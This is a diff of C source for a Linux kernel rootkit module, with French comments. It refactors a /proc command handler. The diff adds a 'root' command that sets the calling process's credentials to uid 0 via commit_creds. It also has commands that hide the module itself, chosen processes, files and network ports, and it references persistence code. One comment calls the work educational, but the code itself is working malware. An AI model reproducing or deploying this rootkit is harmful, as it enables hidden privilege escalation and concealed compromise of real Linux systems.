@@ -10,29 +10,18 @@
 #include "hide_net.h"
 #include "persistence.h"
 
-static pid_t target_pid = 0;
+/*
+ * grant_root: élève les credentials du processus courant (celui qui écrit
+ * dans /proc/root) à uid/gid 0.  L'ancien code acceptait un PID cible mais
+ * commit_creds() s'applique toujours au processus courant — on garde donc
+ * uniquement le mode "self".  Pour élever un autre processus il faudrait
+ * modifier directement sa struct cred via task_cred_xxx(), ce qui est plus
+ * complexe et hors périmètre éducatif.
+ */
+static void grant_root(void)
+{
+    struct cred *new_cred = prepare_creds();
 
-static void grant_root(void) {
-    struct cred *new_cred;
-    pid_t saved_pid;
-
-    if (target_pid != 0) {
-        struct task_struct *task;
-
-        rcu_read_lock();
-        task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
-        if (!task) {
-            rcu_read_unlock();
-            printk(KERN_ERR "pid %d introuvable\n", target_pid);
-            return;
-        }
-        saved_pid = task->pid;
-        rcu_read_unlock();
-    } else {
-        saved_pid = current->pid;
-    }
-
-    new_cred = prepare_creds();
     if (!new_cred) {
         printk(KERN_ERR "prepare_creds a échoué\n");
         return;
@@ -48,10 +37,8 @@ static void grant_root(void) {
     new_cred->fsgid.val = 0;
 
     commit_creds(new_cred);
-
-    printk(KERN_INFO "root donné au pid %d\n", saved_pid);
+    printk(KERN_INFO "root donné au pid %d\n", current->pid);
 }
-
 
 static ssize_t write_pid(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
@@ -59,7 +46,6 @@ static ssize_t write_pid(struct file *file, const char __user *buf,
     char kbuf[256];
     char *name;
     int len;
-    pid_t pid;
 
     if (count > 255)
         return -EINVAL;
@@ -69,44 +55,31 @@ static ssize_t write_pid(struct file *file, const char __user *buf,
 
     kbuf[count] = '\0';
 
-    if (strncmp(kbuf, "hide", 4) == 0 && (kbuf[4] == '\0' || kbuf[4] == '\n')) {
-        set_hide();
-            return count;
-    }
-    if (strncmp(kbuf, "show", 4) == 0 && (kbuf[4] == '\0' || kbuf[4] == '\n')) {
-        unset_hide();
-        return count;
-    }
+    /* strip trailing newline */
+    len = strlen(kbuf);
+    if (len > 0 && kbuf[len - 1] == '\n')
+        kbuf[--len] = '\0';
 
-    if (strncmp(kbuf, "hideproc:", 9) == 0) {
-      pid = simple_strtoul(kbuf + 9, NULL, 10);
-        set_hidden_pid(pid);
-        return count;
-    }
+#define CMD(s) (strncmp(kbuf, (s), sizeof(s) - 1) == 0)
+#define ARG(s) (kbuf + sizeof(s) - 1)
 
-    if (strncmp(kbuf, "hidefile:", 9) == 0) {
-        name = kbuf + 9;
-        len = strlen(name);
-        if (len > 0 && name[len - 1] == '\n')
-              name[len - 1] = '\0';
-        set_hidden_file(name);
-        return count;
-    }
+    if (CMD("hide") && len == 4)        { set_hide();          return count; }
+    if (CMD("show") && len == 4)        { unset_hide();        return count; }
+    if (CMD("root"))                     { grant_root();        return count; }
 
-    if (strncmp(kbuf, "clearfile", 9) == 0) {
-        clear_hidden_file();
-        return count;
-    }
+    if (CMD("hideproc:"))  { set_hidden_pid(simple_strtoul(ARG("hideproc:"),  NULL, 10)); return count; }
+    if (CMD("clearprocs")) { clear_hidden_pids();   return count; }
 
-    if (strncmp(kbuf, "hideport:", 9) == 0) {
-        set_hidden_port(simple_strtoul(kbuf + 9, NULL, 10));
-        return count;
-    }
+    if (CMD("hidefile:"))  { set_hidden_file(ARG("hidefile:"));  return count; }
+    if (CMD("clearfiles")) { clear_hidden_files();  return count; }
 
-    target_pid = simple_strtoul(kbuf, NULL, 10);
+    if (CMD("hideport:"))  { set_hidden_port(simple_strtoul(ARG("hideport:"), NULL, 10)); return count; }
+    if (CMD("clearports")) { clear_hidden_ports();  return count; }
 
-    grant_root();
+#undef CMD
+#undef ARG
 
+    printk(KERN_WARNING "commande inconnue: %s\n", kbuf);
     return count;
 }
 
@@ -116,7 +89,8 @@ static struct proc_ops proc_fops = {
 
 static struct proc_dir_entry *proc_entry;
 
-static int __init rootkit_init(void) {
+static int __init rootkit_init(void)
+{
     int err;
 
     printk(KERN_INFO "chargé\n");
@@ -147,7 +121,8 @@ static int __init rootkit_init(void) {
     return 0;
 }
 
-static void __exit rootkit_exit(void) {
+static void __exit rootkit_exit(void)
+{
     persistence_exit();
     hide_net_exit();
     hide_file_exit();
